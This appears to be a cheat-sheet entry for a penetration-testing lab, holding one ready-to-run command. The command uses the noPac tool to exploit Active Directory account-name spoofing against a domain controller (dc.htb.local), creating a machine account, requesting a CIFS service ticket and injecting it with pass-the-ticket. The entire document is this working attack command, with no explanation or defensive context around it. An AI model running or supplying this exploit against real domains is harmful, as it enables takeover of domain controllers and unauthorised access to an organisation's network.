---
id: 529f9c25-b760-4a5a-ab39-8bdc7fd212a2
name: noPac.exe with cifs service
type: command
executor: bash
data: noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local
  /mAccount demo123 /mPassword Password123! /service cifs /ptt
output: null
created_at: '2023-04-06T03:56:03.185839+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
---

# noPac.exe with cifs service

```bash
noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
```


